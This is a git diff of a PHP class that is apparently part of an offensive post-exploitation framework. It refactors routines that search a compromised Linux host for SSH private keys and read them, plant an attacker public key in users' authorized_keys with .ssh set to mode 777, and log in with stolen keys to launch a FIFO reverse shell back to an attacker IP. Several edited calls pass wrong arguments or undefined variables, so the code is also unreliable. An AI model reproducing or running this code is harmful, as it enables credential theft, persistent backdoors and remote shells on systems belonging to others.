@@ -1,11 +1,7 @@
 <?php
 
 class check4linux8misc extends check4linux8enum{
-    var $tab_authorized_keys_hosts ;
-    var $tab_private_keys ;
-
-
-    
+   
     /*
      * 
   https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
@@ -26,7 +22,6 @@ class check4linux8misc extends check4linux8enum{
         $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout,"");
         $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout,"");
         $this->req_str($stream,"head -5 $private_key_file.pem",$this->stream_timeout,"");
-        return "$private_key_file.pem";
     }
     
     
@@ -43,7 +38,7 @@ class check4linux8misc extends check4linux8enum{
         $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout,"");
         $this->req_str($stream,"file $private_key_file",$this->stream_timeout,"");
         $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
-        return trim($this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" ));
+        $this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" );
     }
     
     
@@ -68,13 +63,16 @@ class check4linux8misc extends check4linux8enum{
         $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout,"");
         $this->req_str($stream,"ls -al $public_key_file",$timeout,"");
         $this->req_str($stream,"file $public_key_file",$timeout,"");
-        return trim($this->req_str($stream,"head -5 $public_key_file",$timeout,""));
+        $this->req_str($stream,"head -5 $public_key_file",$timeout,"");
         
     }
     
     
-    public function keys4check($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
+    public function key2check4add($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
         $this->ssTitre(__FUNCTION__);
+        
+  
+        
         
         $query = "cat $authorized_keys_filepath";
         $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
@@ -115,7 +113,7 @@ class check4linux8misc extends check4linux8enum{
     
     
     
-    public function service4authorized_keys($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
+    public function key2run($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
         $this->ssTitre(__FUNCTION__);
         $result = "";
         $timeout = 10 ;
@@ -127,8 +125,8 @@ class check4linux8misc extends check4linux8enum{
         $obj_file = new FILE($private_key_ssh_rsa_file);
         $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
         $pass_phrase = '';
-        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
-        $public_keys_str = $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
+        $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
+        $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
         
         $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
         $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
@@ -154,7 +152,7 @@ class check4linux8misc extends check4linux8enum{
             
             
             $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
-            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
+            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,"$this->filter_file_path | grep \"authorized_keys\" ");
             
         }
         
@@ -163,28 +161,12 @@ class check4linux8misc extends check4linux8enum{
             if ($remote_username === "root" ) $password2use = $this->root_passwd;
             else $password2use = $this->created_user_pass ;
             
-            if ($this->keys4check($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
+            if ($this->key2check4add($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
                 
                 $ssh_ports = $this->ip2ports4service("ssh");
                 foreach ($ssh_ports as $ssh_open)
                     if(!empty($ssh_open)) {
-                        
-                        $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $local_username, $private_key_ssh_rsa_file,"");
-                        if(is_resource($stream)){
-                            $info = "SSH Private Key:$private_key_ssh_rsa_file";
-                            $this->log2succes($info);
-                            $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
-                            $templateB64_shell = base64_encode($template_shell);
-                            $attacker_ip = $this->ip4addr4target($this->ip);
-                            $attacker_port = rand(1024,65535);
-                            $shell = "/bin/bash";
-                            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
-                            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
-                            $lport = $ssh_open;
-                            $lprotocol = 'T' ;
-                            $type = "server";
-                            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
-                        }
+                        $this->key2run8remote($stream, $ssh_open, $local_username, $private_key_ssh_rsa_file);
                         
                     }
                 
@@ -194,106 +176,7 @@ class check4linux8misc extends check4linux8enum{
         return $result;
     }
     
-    
-    public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
-        $this->ssTitre(__FUNCTION__);
-        $this->str2file($private_key_str, $private_key_file);
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
-        }
-        return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
-        
-    }
-    public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str,$private_key_file,$private_key_passwd){
-        $this->ssTitre(__FUNCTION__);
-        $this->str2file($private_key_str, $private_key_file);
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $private_key_passwd);
-            $this->key2gen4public("",10, $private_key_file, $public_key_file,$private_key_passwd);
-        }
-        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
-    }
-    
-    public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
-        /*
-         https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
-         */
-        $this->ssTitre(__FUNCTION__);
-        
-        $obj_file = new FILE($private_key_file);
-        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
-        
-        
-        if (!file_exists($public_key_file)) {
-            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
-        }
-        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
-    }
-    
-    
-    public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
-        $this->ssTitre(__FUNCTION__);
-        $login = trim($login);
-        
-        $query = "file $private_key_file";
-        $check_pem = trim($this->req_ret_str($query));
-        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
-            $this->log2succes("Convert PEM for libssh - PHP");
-            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
-        }
-        $query = "head -5 $private_key_file";
-        $priv_keys = trim($this->req_ret_str($query));
-        if (empty($priv_keys)) return $this->log2error("Empty Private Key");
-        $query = "head -5 $public_key_file";
-        $pub_keys = trim($this->req_ret_str($query));
-        if (empty($pub_keys)) return $this->log2error("Empty Public Key");
-        $cmd = "id";
-        $this->requette("chmod 600 $private_key_file");
-        $this->requette("head -5 $private_key_file");
-        $query = "ssh -i $private_key_file $login@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
-        $this->cmd("localhost",$query);
-        
-        
-        $con = @ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
-        if($con===FALSE) {
-            $chaine = "Failed Connection";
-            $this->log2error($chaine);
-            return FALSE ;
-        }
-        $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
-        $this->note($infos);
-        
-        
-        $this->requette("ls -al $public_key_file");
-        $this->requette("file $public_key_file");
-        $this->requette("head -5 $public_key_file");
-        
-        $this->requette("ls -al $private_key_file");
-        $this->requette("file $private_key_file");
-        $this->requette("head -5 $private_key_file");
-        if (@ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
-            
-            $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
-            $this->log2succes("Identification réussie en utilisant une clé publique");
-            $this->port2shell(base64_encode($infos));
-            $this->pause();
-            return $con ;
-        } else {
-            $chaine = "Failed Public Key Authentication";
-            $this->log2error($chaine);
-            return FALSE ;
-        }
-        
-        // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
-        // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
-        
-    }
-    
-    
+
     
     public function misc2writable_files($stream){
         $this->ssTitre(__FUNCTION__);
@@ -422,7 +305,7 @@ lxc launch SomeAlias MyMachine
     public function misc($stream){
         $this->titre(__FUNCTION__);
         
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->key($stream);$this->pause();
        return 0 ;
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports($stream);$this->pause();
@@ -432,7 +315,7 @@ lxc launch SomeAlias MyMachine
        if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2container($stream);$this->pause();
-       if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->key($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd($stream);$this->pause();
     }
     
@@ -516,7 +399,7 @@ lxc launch SomeAlias MyMachine
     
      
     
-    public function misc2user8key($stream,$username,$remote_privkey_path,$ssh_port){
+    public function key2run8local($stream,$username,$remote_privkey_path,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $remote_privkey_path = trim($remote_privkey_path);
@@ -530,7 +413,7 @@ lxc launch SomeAlias MyMachine
 
  
     
-    public function misc2keys2authorized_keys_file($stream,$authorized_keys_filepath){
+    public function key2authorized_keys_file($stream,$authorized_keys_filepath){
         $this->ssTitre(__FUNCTION__);
         //===============================================================
 
@@ -541,7 +424,7 @@ lxc launch SomeAlias MyMachine
                 $local_home_user = "";
                 $ip2users = $this->ip2users4passwd();
                 foreach ($ip2users as $remote_username => $remote_userpass)
-                    $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
+                    $this->key2run($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
             
         }
         //===============================================================
@@ -549,7 +432,7 @@ lxc launch SomeAlias MyMachine
     }
     
     
-    public function misc2keys4authorized_keys_file($stream,$path2search){
+    public function key4authorized_keys_file($stream,$path2search){
         $this->ssTitre(__FUNCTION__);
         //===============================================================
         $data = "find $path2search -name \"authorized_keys\" -exec cat {} 2>/dev/null \;";
@@ -563,7 +446,7 @@ lxc launch SomeAlias MyMachine
         $this->pause();
         
         foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
-            $this->misc2keys2authorized_keys_file($stream,$authorized_keys_filepath);
+            $this->key2authorized_keys_file($stream,$authorized_keys_filepath);
         }
         //===============================================================
         
@@ -571,16 +454,16 @@ lxc launch SomeAlias MyMachine
     
 
     
-    public function misc2keys4add($stream,$path2search){
+    public function key4add($stream,$path2search){
         $this->ssTitre(__FUNCTION__);
         $tab_home = array();
         $this->note("home user");
-        $data = "ls -dl $path2search/home/* 2>/dev/null ";
+        $data = "ls -dl $path2search.home/* 2>/dev/null ";
         $filter = "| awk '{print $9}' $this->filter_file_path ";
         $tab_home = $this->req_tab($stream,$data,$this->stream_timeout,$filter);
         var_dump($tab_home);
         $this->pause();
-        $data = "ls -dl $path2search/root 2>/dev/null ";
+        $data = "ls -dl $path2search.root 2>/dev/null ";
         $filter = "| awk '{print $9}' $this->filter_file_path ";
         $tab_home[] = $this->req_str($stream,$data,$this->stream_timeout,$filter);
         $tab_home = array_reverse($tab_home);
@@ -589,31 +472,49 @@ lxc launch SomeAlias MyMachine
         if (isset($tab_home[0])){
             foreach ($tab_home as $home_user){
                 $home_user = trim($home_user);
-                if (!empty($home_user)) $this->misc2keys2add($stream,$home_user);
+                if (!empty($home_user)) $this->key2add($stream,$home_user);
             }
         }
         
     }
     
-    public function misc2keys2add($stream,$home_user){
+    public function key2add($stream,$home_user,$pubkey_str){
         $this->ssTitre(__FUNCTION__);
         $remote_username = "";
         $tmp = array();
         $this->article("home user",$home_user);
-        $authorized_keys_filepath = "";
-        $authorized_keys_str = "";
+
         $query = "echo '$home_user' $this->filter_file_path | sed \"s#/tmp/$this->ip.$this->port.nfs##g\"  | sed \"s#/home/##g\" | sed \"s#/##g\" | grep -Po \"[a-z0-9\_]{1,}\" ";
         exec($query,$tmp);
         $this->requette($query);
         if (isset($tmp[0])) $remote_username = trim($tmp[0]);
         
         $this->article("Remote Username", $remote_username);
-        if (!empty($remote_username)) $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
+        if (!empty($remote_username)) {
+            $this->req_str($stream,"cd $home_user; whoami",$this->stream_timeout,"");
+            $query = "cd $home_user; ls -al";
+            $this->req_str($stream,$query,$this->stream_timeout,"");
+            $this->req_str($stream," whoami",$this->stream_timeout,"");
+            if (!$this->file4exist8path($stream, "$home_user/.ssh")){
+            $this->req_str($stream,"cd $home_user; mkdir $home_user/.ssh",$this->stream_timeout,"");
+            $query = "cd $home_user; chmod 777 -R $home_user/.ssh";
+            $this->req_str($stream,$query,$this->stream_timeout,"");
+            }
+            if (!$this->file4exist8path($stream, "$home_user/.ssh/authorized_keys")){
+            $query = "cd $home_user; echo '$pubkey_str' > $home_user/.ssh/authorized_keys";
+            $this->req_str($stream,$query,$this->stream_timeout,"");
+            }
+
+        }
+        $query = "cd $home_user; ls -al $home_user/.ssh";
+        $this->req_str($stream,$query,$this->stream_timeout,"");
         
+        if (!$this->file4search8path($stream, "$home_user/.ssh/authorized_keys", $pubkey_str)) return TRUE;
+        else return FALSE;
         
     }
     
-    public function misc2keys4info($stream){
+    public function key4info($stream){
         $this->ssTitre(__FUNCTION__);
         //===============================================================
         $data = "ls -alR ~/.ssh ";
@@ -642,17 +543,44 @@ lxc launch SomeAlias MyMachine
         if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
     }
 
-  
+
     
-    public function misc2keys4users($stream,$path2search){
+    
+    public function key2run8remote($stream,$username,$local_privkey_path,$ssh_port, $ssh_open){
+        $this->titre(__FUNCTION__);
+        
+        $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $username, $local_privkey_path,"");
+        if(is_resource($stream)){
+            $info = "SSH Private Key:$local_privkey_path";
+            $this->log2succes($info);
+            $template_shell = "ssh -i $local_privkey_path -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
+            $templateB64_shell = base64_encode($template_shell);
+            $attacker_ip = $this->ip4addr4target($this->ip);
+            $attacker_port = rand(1024,65535);
+            $shell = "/bin/bash";
+            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
+            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
+            $lport = $ssh_open;
+            $lprotocol = 'T' ;
+            $type = "server";
+            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+        }
+    }
+  
+    public function key2list2path($stream,$path2search):array{
+        $this->titre(__FUNCTION__);
+        $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
+        $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
+        return  $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
+    }
+    
+    public function key4users($stream,$path2search){
         $this->titre(__FUNCTION__);
         $tab_privkeys = array();
         $ssh_ports = $this->ip2ports4service("ssh");
         if (!empty($ssh_ports)){
             
-        $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
-        $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
-        $tab_privkeys = $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
+        $tab_privkeys = $this->key2list2path($stream,$path2search);
         $this->pause();
         
         $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
@@ -667,7 +595,10 @@ lxc launch SomeAlias MyMachine
                 $remote_privkey_path = trim($remote_privkey_path);
                 foreach ($tab_users_shell as $username){                    
                     foreach ($ssh_ports as $ssh_port){
-                        if ( !empty($username) && !empty($ssh_port) ) $this->misc2user8key($stream,$username, $remote_privkey_path, $ssh_port);
+                        if ( !empty($username) && !empty($ssh_port) ) {
+                            $this->key2run8remote($stream, $ssh_port, $username, $local_privkey_path, $ssh_port);
+                            $this->key2run8local($stream,$username, $remote_privkey_path, $ssh_port);
+                        }
             }
                 }
             }
@@ -700,11 +631,8 @@ lxc launch SomeAlias MyMachine
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
                 if (!$this->ip2root8db($this->ip2id)) {
-                    
-                    
-                    $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);
-
-                    $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
+                  $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);
+                  $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
                 }
             }
         }
@@ -712,12 +640,11 @@ lxc launch SomeAlias MyMachine
     }
     
     
-    public function misc2keys($stream,$path2search){
+    public function key($stream,$path2search){
         $this->titre(__FUNCTION__);
-        $path2search = "/";
-        $this->misc2keys4users($stream,$path2search);$this->pause(); // OK 
-        $this->misc2keys4info($stream,$path2search);$this->pause();        
-        $this->misc2keys4authorized_keys_file($stream,$path2search);$this->pause();
+        $this->key4info($stream,$path2search);$this->pause(); 
+        $this->key4users($stream,$path2search);$this->pause(); // OK                
+        $this->key4authorized_keys_file($stream,$path2search);$this->pause();
         
     }
     
